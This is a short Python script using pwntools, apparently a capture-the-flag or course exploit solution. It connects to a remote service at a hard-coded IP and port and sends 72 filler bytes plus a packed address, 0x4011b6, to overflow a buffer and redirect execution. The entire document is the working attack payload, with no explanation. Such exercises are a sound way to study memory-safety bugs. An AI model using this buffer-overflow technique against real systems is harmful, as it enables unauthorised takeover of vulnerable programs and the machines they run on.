from pwn import *
r = remote('140.113.207.240',8834)
r.recvuntil('Your spell:')
targer_address = p64(0x4011b6)
r.sendline(b'A' * 72 + targer_address)
#r.interactive()
print(r.recvall(1))
